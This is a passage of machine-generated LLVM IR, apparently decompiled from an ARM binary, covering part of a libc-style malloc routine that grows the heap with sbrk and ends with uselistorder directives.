  br label %dec_label_pc_12f04

bb159:                                            ; preds = %dec_label_pc_12ecc
  %v1_12eec = load i32, i32* %r0.global-to-local, align 4
  %v8_12eec = icmp eq i32 %v1_12eec, -1
  store i32 %v2_12ee4, i32* %v2_12edc, align 4
  br i1 %v8_12eec, label %.thread34, label %dec_label_pc_12f04

.thread34:                                        ; preds = %bb159
  %v1_12ef4 = load i32, i32* @r5, align 4
  %v2_12ef4 = load i32, i32* @r8, align 4
  %v3_12ef4 = add i32 %v2_12ef4, %v1_12ef4
  %v2_12ef8 = or i32 %v3_12ef4, 1
  store i32 %v2_12ef8, i32* %r3.global-to-local, align 4
  %v2_12efc = load i32, i32* %r2.global-to-local, align 4
  %v3_12efc = add i32 %v2_12efc, 4
  %v4_12efc = inttoptr i32 %v3_12efc to i32*
  store i32 %v2_12ef8, i32* %v4_12efc, align 4
  br label %dec_label_pc_1307c

dec_label_pc_12f04:                               ; preds = %bb159, %.thread122
  %v0_12f08.pr = load i32, i32* @r8, align 4
  %v0_12f04 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f04 = add i32 %v0_12f04, 864
  %v2_12f04 = inttoptr i32 %v1_12f04 to i32*
  %v3_12f04 = load i32, i32* %v2_12f04, align 4
  store i32 %v3_12f04, i32* %r2.global-to-local, align 4
  %v2_12f08 = icmp eq i32 %v0_12f08.pr, 0
  br i1 %v2_12f08, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_12f04
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_12f04
  %v2_12f10 = urem i32 %v3_12f04, 2
  store i32 %v2_12f10, i32* %r3.global-to-local, align 4
  %v2_12f14 = icmp eq i32 %v2_12f10, 0
  br i1 %v2_12f14, label %.thread40, label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %.thread36
  %v0_12f1c = load i32, i32* @r4, align 4
  %v1_12f1c = load i32, i32* %r1.global-to-local, align 4
  %v3_12f1c = icmp ult i32 %v0_12f1c, %v1_12f1c
  br i1 %v3_12f1c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_12f1c
  %v2_12f20 = and i32 %v3_12f04, -2
  store i32 %v2_12f20, i32* %r3.global-to-local, align 4
  store i32 %v2_12f20, i32* %v2_12f04, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_12f1c, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  %v4_12f30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12f30, i32* @r7, align 4
  %v1_12f34 = add i32 %v4_12f30, 864
  %v2_12f34 = inttoptr i32 %v1_12f34 to i32*
  %v3_12f34 = load i32, i32* %v2_12f34, align 4
  store i32 %v3_12f34, i32* %r3.global-to-local, align 4
  %v1_12f38 = urem i32 %v3_12f34, 2
  store i32 %v1_12f38, i32* @r6, align 4
  %v2_12f38 = icmp eq i32 %v1_12f38, 0
  br i1 %v2_12f38, label %dec_label_pc_12fcc, label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %.thread40
  %v0_12f40 = load i32, i32* @r8, align 4
  %v2_12f40 = icmp eq i32 %v0_12f40, 0
  br i1 %v2_12f40, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_12f40
  %v2_12f44 = add i32 %v4_12f30, 872
  %v3_12f44 = inttoptr i32 %v2_12f44 to i32*
  %v4_12f44 = load i32, i32* %v3_12f44, align 4
  store i32 %v4_12f44, i32* %r2.global-to-local, align 4
  %v1_12f48 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f48 = load i32, i32* @r4, align 4
  %v3_12f48 = sub i32 %v2_12f48, %v1_12f48
  %v3_12f4c = add i32 %v3_12f48, %v4_12f44
  store i32 %v3_12f4c, i32* %r3.global-to-local, align 4
  store i32 %v3_12f4c, i32* %v3_12f44, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12f40, %bb161
  %v0_12f54 = load i32, i32* @r4, align 4
  %v1_12f54 = urem i32 %v0_12f54, 8
  store i32 %v1_12f54, i32* %r3.global-to-local, align 4
  %v2_12f54 = icmp eq i32 %v1_12f54, 0
  br i1 %v2_12f54, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_12f58 = sub nsw i32 8, %v1_12f54
  store i32 %v2_12f58, i32* %r3.global-to-local, align 4
  %v3_12f5c = add i32 %v2_12f58, %v0_12f54
  store i32 %v3_12f5c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_12f64 = phi i32 [ 0, %.thread43 ], [ %v2_12f58, %bb162 ]
  %v1_12f60 = load i32, i32* @r5, align 4
  %v2_12f60 = add i32 %v1_12f60, %v0_12f54
  store i32 %v2_12f60, i32* @r6, align 4
  %v1_12f64 = load i32, i32* @r8, align 4
  %v2_12f64 = add i32 %v2_12f60, %v0_12f64
  %v2_12f68 = add i32 %v2_12f64, %v1_12f64
  store i32 %v2_12f68, i32* %r1.global-to-local, align 4
  %v1_12f6c = load i32, i32* %sb.global-to-local, align 4
  %v2_12f6c = add i32 %v1_12f6c, %v2_12f68
  %v1_12f70 = load i32, i32* %fp.global-to-local, align 4
  %v2_12f70 = and i32 %v1_12f70, %v2_12f6c
  store i32 %v2_12f70, i32* %r2.global-to-local, align 4
  %v2_12f74 = sub i32 0, %v2_12f60
  store i32 %v2_12f74, i32* %r3.global-to-local, align 4
  %v2_12f78 = sub i32 %v2_12f70, %v2_12f60
  store i32 %v2_12f78, i32* @r5, align 4
  store i32 %v2_12f78, i32* %r0.global-to-local, align 4
  br i1 %v2_12f54, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_12f54, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_12f84 = call i32 @__GI_sbrk(i32 %v2_12f78)
  store i32 %v1_12f84, i32* %r0.global-to-local, align 4
  %v3_12f88 = icmp eq i32 %v1_12f84, -1
  br i1 %v3_12f88, label %dec_label_pc_12f90, label %dec_label_pc_12fa0

dec_label_pc_12f90:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12f94 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12f94, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12fa0:                               ; preds = %bb164
  %v1_12fa0 = load i32, i32* @r4, align 4
  %v3_12fa0 = icmp ult i32 %v1_12f84, %v1_12fa0
  br i1 %v3_12fa0, label %dec_label_pc_12fa8, label %dec_label_pc_12ff8

dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12fa0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r0.global-to-local, align 4
  %v4_12fb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12fb0, i32* %r2.global-to-local, align 4
  %v1_12fb4 = add i32 %v4_12fb0, 864
  %v2_12fb4 = inttoptr i32 %v1_12fb4 to i32*
  %v3_12fb4 = load i32, i32* %v2_12fb4, align 4
  %v0_12fb8 = load i32, i32* @r6, align 4
  store i32 %v0_12fb8, i32* %r0.global-to-local, align 4
  %v1_12fbc = and i32 %v3_12fb4, -2
  store i32 %v1_12fbc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12fbc, i32* %v2_12fb4, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12fcc:                               ; preds = %.thread40
  %v0_12fcc = load i32, i32* %r0.global-to-local, align 4
  %v3_12fcc = icmp eq i32 %v0_12fcc, -1
  br i1 %v3_12fcc, label %dec_label_pc_12fd4, label %dec_label_pc_12ff0

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fcc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12fd8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12fd8, i32* %r0.global-to-local, align 4
  %v0_12fdc = load i32, i32* @r7, align 4
  %v1_12fdc = add i32 %v0_12fdc, 872
  %v2_12fdc = inttoptr i32 %v1_12fdc to i32*
  %v3_12fdc = load i32, i32* %v2_12fdc, align 4
  store i32 %v3_12fdc, i32* %r2.global-to-local, align 4
  %v0_12fe0 = load i32, i32* @r4, align 4
  %v0_12fe4 = load i32, i32* @r5, align 4
  %v2_12fe0 = add i32 %v3_12fdc, %v1_12fd8
  %v2_12fe4 = sub i32 %v2_12fe0, %v0_12fe0
  %v2_12fe8 = sub i32 %v2_12fe4, %v0_12fe4
  store i32 %v2_12fe8, i32* %r3.global-to-local, align 4
  store i32 %v2_12fe8, i32* %v2_12fdc, align 4
  %v0_12ff4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12ff0

dec_label_pc_12ff0:                               ; preds = %dec_label_pc_12fcc, %dec_label_pc_12fd4
  %v0_12ff4 = phi i32 [ 0, %dec_label_pc_12fcc ], [ %v0_12ff4.pre, %dec_label_pc_12fd4 ]
  %v0_12ff0 = load i32, i32* @r4, align 4
  store i32 %v0_12ff0, i32* @r7, align 4
  store i32 %v0_12ff4, i32* @r5, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12fa0, %dec_label_pc_12fa8, %dec_label_pc_12f90, %dec_label_pc_12ff0
  %v0_12ff8 = load i32, i32* %r0.global-to-local, align 4
  %v7_12ff8 = icmp eq i32 %v0_12ff8, -1
  br i1 %v7_12ff8, label %dec_label_pc_1307c, label %dec_label_pc_13000

dec_label_pc_13000:                               ; preds = %dec_label_pc_12ff8
  %v1_13000 = load i32, i32* @r5, align 4
  %v2_13000 = add i32 %v1_13000, %v0_12ff8
  %v0_13004 = load i32, i32* @r7, align 4
  %v2_13004 = sub i32 %v2_13000, %v0_13004
  %v1_13008 = or i32 %v2_13004, 1
  %v2_1300c = add i32 %v0_13004, 4
  %v3_1300c = inttoptr i32 %v2_1300c to i32*
  store i32 %v1_13008, i32* %v3_1300c, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_13018 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_13018, i32* @r6, align 4
  %v1_1301c = add i32 %v4_13018, 872
  %v2_1301c = inttoptr i32 %v1_1301c to i32*
  %v3_1301c = load i32, i32* %v2_1301c, align 4
  %v0_13020 = load i32, i32* @r8, align 4
  %v2_13020 = icmp eq i32 %v0_13020, 0
  %v0_13024 = load i32, i32* @r5, align 4
  %v2_13024 = add i32 %v0_13024, %v3_1301c
  store i32 %v2_13024, i32* %r3.global-to-local, align 4
  store i32 %v2_13024, i32* %v2_1301c, align 4
  %v0_1302c = load i32, i32* @r7, align 4
  %v1_1302c = load i32, i32* @r6, align 4
  %v2_1302c = add i32 %v1_1302c, 44
  %v3_1302c = inttoptr i32 %v2_1302c to i32*
  store i32 %v0_1302c, i32* %v3_1302c, align 4
  br i1 %v2_13020, label %dec_label_pc_1307c, label %dec_label_pc_13034

dec_label_pc_13034:                               ; preds = %dec_label_pc_13000
  %v0_13038 = load i32, i32* @r8, align 4
  %v1_13038 = add i32 %v0_13038, -12
  %v1_1303c = and i32 %v1_13038, -8
  store i32 %v3_12e04, i32* %ip.global-to-local, align 4
  %v2_13044 = add i32 %v1_1303c, %v3_12e04
  store i32 %v2_13044, i32* %r1.global-to-local, align 4
  %v2_13048 = icmp ugt i32 %v1_1303c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_13050 = or i32 %v1_1303c, 1
  store i32 %v1_13050, i32* %r3.global-to-local, align 4
  store i32 %v1_13050, i32* %v2_12e10, align 4
  %v0_13058 = load i32, i32* %r2.global-to-local, align 4
  %v1_13058 = load i32, i32* %r1.global-to-local, align 4
  %v2_13058 = add i32 %v1_13058, 8
  %v3_13058 = inttoptr i32 %v2_13058 to i32*
  store i32 %v0_13058, i32* %v3_13058, align 4
  %v0_1305c = load i32, i32* %r2.global-to-local, align 4
  %v1_1305c = load i32, i32* %r1.global-to-local, align 4
  %v2_1305c = add i32 %v1_1305c, 4
  %v3_1305c = inttoptr i32 %v2_1305c to i32*
  store i32 %v0_1305c, i32* %v3_1305c, align 4
  br i1 %v2_13048, label %dec_label_pc_13064, label %dec_label_pc_1307c

dec_label_pc_13064:                               ; preds = %dec_label_pc_13034
  %v0_13064 = load i32, i32* @r6, align 4
  %v1_13064 = add i32 %v0_13064, 836
  %v2_13064 = inttoptr i32 %v1_13064 to i32*
  %v3_13064 = load i32, i32* %v2_13064, align 4
  store i32 %v3_13064, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1306c = load i32, i32* %ip.global-to-local, align 4
  %v1_1306c = add i32 %v0_1306c, 8
  store i32 %v1_1306c, i32* @r0, align 4
  store i32 -1, i32* %v2_13064, align 4
  %v0_13074 = call i32 @free()
  store i32 %v0_13074, i32* %r0.global-to-local, align 4
  %v0_13078 = load i32, i32* @r4, align 4
  %v1_13078 = load i32, i32* @r6, align 4
  %v2_13078 = add i32 %v1_13078, 836
  %v3_13078 = inttoptr i32 %v2_13078 to i32*
  store i32 %v0_13078, i32* %v3_13078, align 4
  br label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %.thread34, %dec_label_pc_13034, %dec_label_pc_13000, %dec_label_pc_12ff8, %dec_label_pc_13064
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r0.global-to-local, align 4
  %v4_13084 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_13084, i32* %lr.global-to-local, align 4
  %v1_13088 = add i32 %v4_13084, 872
  store i32 %v1_13088, i32* %r1.global-to-local, align 4
  %v1_1308c = inttoptr i32 %v1_13088 to i32*
  %v2_1308c = load i32, i32* %v1_1308c, align 4
  store i32 %v2_1308c, i32* %r1.global-to-local, align 4
  %v3_1308c = add i32 %v4_13084, 876
  %v4_1308c = inttoptr i32 %v3_1308c to i32*
  %v5_1308c = load i32, i32* %v4_1308c, align 4
  store i32 %v5_1308c, i32* %r3.global-to-local, align 4
  %v1_13094 = add i32 %v4_13084, 868
  %v2_13094 = inttoptr i32 %v1_13094 to i32*
  %v3_13094 = load i32, i32* %v2_13094, align 4
  store i32 %v3_13094, i32* %r3.global-to-local, align 4
  %v1_13098 = add i32 %v4_13084, 884
  %v2_13098 = inttoptr i32 %v1_13098 to i32*
  %v3_13098 = load i32, i32* %v2_13098, align 4
  store i32 %v3_13098, i32* %r2.global-to-local, align 4
  %v2_1309c = add i32 %v3_13094, %v2_1308c
  store i32 %v2_1309c, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_1308c, %v5_1308c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_1307c
  store i32 %v2_1308c, i32* %v4_1308c, align 4
  %v0_130a4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_130a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_1307c, %bb165
  %v1_130a4 = phi i32 [ %v3_13098, %dec_label_pc_1307c ], [ %v1_130a4.pre, %bb165 ]
  %v4_130a8 = phi i32 [ %v2_1309c, %dec_label_pc_1307c ], [ %v0_130a4.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_130a8, %v1_130a4
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_130a8 = load i32, i32* %lr.global-to-local, align 4
  %v6_130a8 = add i32 %v5_130a8, 884
  %v7_130a8 = inttoptr i32 %v6_130a8 to i32*
  store i32 %v4_130a8, i32* %v7_130a8, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_130ac = load i32, i32* %lr.global-to-local, align 4
  %v1_130ac = add i32 %v0_130ac, 44
  %v2_130ac = inttoptr i32 %v1_130ac to i32*
  %v3_130ac = load i32, i32* %v2_130ac, align 4
  store i32 %v3_130ac, i32* %ip.global-to-local, align 4
  %v1_130b0 = add i32 %v3_130ac, 4
  %v2_130b0 = inttoptr i32 %v1_130b0 to i32*
  %v3_130b0 = load i32, i32* %v2_130b0, align 4
  store i32 %v1_12cc4, i32* %r1.global-to-local, align 4
  %v1_130b8 = and i32 %v3_130b0, -4
  store i32 %v1_130b8, i32* %r3.global-to-local, align 4
  %v3_130bc = icmp ult i32 %v1_130b8, %v1_12cc4
  br i1 %v3_130bc, label %dec_label_pc_130e8, label %dec_label_pc_130c4

dec_label_pc_130c4:                               ; preds = %bb168
  %v0_130c4 = load i32, i32* @sl, align 4
  %v2_130c4 = sub i32 %v1_130b8, %v0_130c4
  %v2_130c8 = add i32 %v0_130c4, %v3_130ac
  store i32 %v2_130c8, i32* %r1.global-to-local, align 4
  %v1_130cc = or i32 %v2_130c4, 1
  store i32 %v1_130cc, i32* %r3.global-to-local, align 4
  %v1_130d0 = or i32 %v0_130c4, 1
  store i32 %v1_130d0, i32* %r2.global-to-local, align 4
  %v1_130d4 = add i32 %v3_130ac, 8
  store i32 %v1_130d4, i32* %r0.global-to-local, align 4
  store i32 %v1_130d0, i32* %v2_130b0, align 4
  %v0_130dc = load i32, i32* %r1.global-to-local, align 4
  %v1_130dc = load i32, i32* %lr.global-to-local, align 4
  %v2_130dc = add i32 %v1_130dc, 44
  %v3_130dc = inttoptr i32 %v2_130dc to i32*
  store i32 %v0_130dc, i32* %v3_130dc, align 4
  %v0_130e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_130e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_130e0 = add i32 %v1_130e0, 4
  %v3_130e0 = inttoptr i32 %v2_130e0 to i32*
  store i32 %v0_130e0, i32* %v3_130e0, align 4
  br label %dec_label_pc_130f8

dec_label_pc_130e8:                               ; preds = %bb157, %bb168, %dec_label_pc_12ec4
  %v0_130e8 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_130f0 = inttoptr i32 %v0_130e8 to i32*
  store i32 12, i32* %v2_130f0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_130f8

dec_label_pc_130f8:                               ; preds = %bb151, %bb150, %dec_label_pc_130c4, %dec_label_pc_12d0c, %dec_label_pc_130e8
  %v0_130f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_130f8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %.thread1, %dec_label_pc_12cd8, %.thread121, %dec_label_pc_12b48, %dec_label_pc_12b3c, %dec_label_pc_129a4, %dec_label_pc_12928, %dec_label_pc_130f8
  store i32 %v2_12850, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v4_1310c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 24) to i32*), align 4
  store i32 %v4_1310c, i32* @ip, align 4
  store i32 78104, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1310c)
  br label %dec_label_pc_13118

dec_label_pc_13118:                               ; preds = %dec_label_pc_12888, %dec_label_pc_130fc
  %v0_13118 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13118, i32* %r0.global-to-local, align 4
  store i32 %v3_12824, i32* @r4, align 4
  store i32 %v6_12824, i32* @r5, align 4
  store i32 %v9_12824, i32* @r6, align 4
  store i32 %v12_12824, i32* @r7, align 4
  store i32 %v15_12824, i32* @r8, align 4
  store i32 %v18_12824, i32* @sb, align 4
  store i32 %v21_12824, i32* @sl, align 4
  store i32 %v24_12824, i32* @fp, align 4
  store i32 %v27_12824, i32* @lr, align 4
  ret i32 %v0_13118

; uselistorder directives
  uselistorder i32 %v0_130c4, { 1, 0, 2 }
  uselistorder i32 %v3_130ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_130a8, { 1, 0 }
  uselistorder i32 %v2_1308c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13084, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1303c, { 1, 2, 0 }
  uselistorder i32 %v0_13004, { 1, 0 }
  uselistorder i32 %v0_12ff8, { 1, 0 }
  uselistorder i32 %v2_12fe8, { 1, 0 }
  uselistorder i32 %v2_12f78, { 2, 1, 0 }
  uselistorder i32 %v2_12f60, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12f58, { 1, 0, 2 }
  uselistorder i32 %v1_12f54, { 2, 1, 0 }
  uselistorder i32 %v0_12f54, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12f38, { 1, 0 }
  uselistorder i32 %v2_12f10, { 1, 0 }
  uselistorder i32 %v3_12f04, { 1, 0, 2 }
  uselistorder i32 %v2_12ee4, { 1, 0, 2 }
  uselistorder i32* %v2_12edc, { 1, 0, 2 }
  uselistorder i32 %v0_12ec4, { 1, 0 }
  uselistorder i32 %v6_12ea0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12e8c, { 2, 1, 0 }
  uselistorder i32 %v0_12e74, { 1, 0 }
  uselistorder i32 %v2_12e30, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12e2c, { 1, 0 }
  uselistorder i32 %v3_12e04, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12de4, { 1, 0, 2 }
  uselistorder i32 %v2_12dcc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12d74, { 2, 1, 0 }
  uselistorder i32 %v6_12d68, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12d44, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12d04, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12cc4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12cbc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12cb8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12ca4, { 1, 0 }
  uselistorder i32 %v7_12c64, { 1, 0 }
  uselistorder i32 %v4_12c64, { 1, 0 }
  uselistorder i32 %v0_12c34, { 1, 0 }
  uselistorder i32 %v2_12c08, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_12c0454, { 1, 0 }
  uselistorder i32 %v1_12bd0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_12bb8., { 1, 2, 0 }
  uselistorder i32 %v0_12bc0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12bc0, { 1, 0 }
  uselistorder i32 %v3_12ba0, { 1, 0 }
  uselistorder i32 %v4_12b9c, { 1, 0, 2 }
  uselistorder i32 %v1_12b0c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12b64, { 1, 0 }
  uselistorder i32 %v1_12b48, { 1, 0 }
  uselistorder i32 %v1_129e8, { 1, 0 }
  uselistorder i32 %v0_12b28, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12af0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12b84.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12acc, { 2, 1, 0 }
  uselistorder i32 %v3_12ac0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_129e0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_12a88, { 1, 0 }
  uselistorder i32 %v3_12a7c, { 1, 0 }
  uselistorder i32 %v0_12a88, { 1, 0 }
  uselistorder i32 %v3_12a60, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12a50, { 1, 0, 2 }
  uselistorder i32 %v3_12a08, { 2, 1, 0 }
  uselistorder i32 %v0_129f8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_129c8, { 1, 0 }
  uselistorder i32 %v1_1297c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12978, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_1291c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12910, { 1, 0 }
  uselistorder i32 %v3_128e0, { 1, 0 }
  uselistorder i32 %v0_128d4, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_128b4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_128a8, { 1, 0 }
  uselistorder i32 %v0_12880, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_13118, { 1, 0 }
  uselistorder label %dec_label_pc_130fc, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_130f8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_130e8, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_1307c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12ff8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12ff0, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12ec4, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_12df8, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_12cb0, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_12c04, { 1, 0 }
  uselistorder label %dec_label_pc_12c0c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12bd0, { 1, 0 }
  uselistorder label %dec_label_pc_12b84, { 1, 0 }
  uselistorder label %dec_label_pc_12b18, { 1, 0 }
  uselistorder label %dec_label_pc_12b14, { 1, 0 }
  uselistorder label %dec_label_pc_12ac0, { 1, 0 }
  uselistorder label %dec_label_pc_12aac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12a74, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12a60, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_1312c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1312c:
  %v0_1312c = load i1, i1* @cpsr_z, align 1
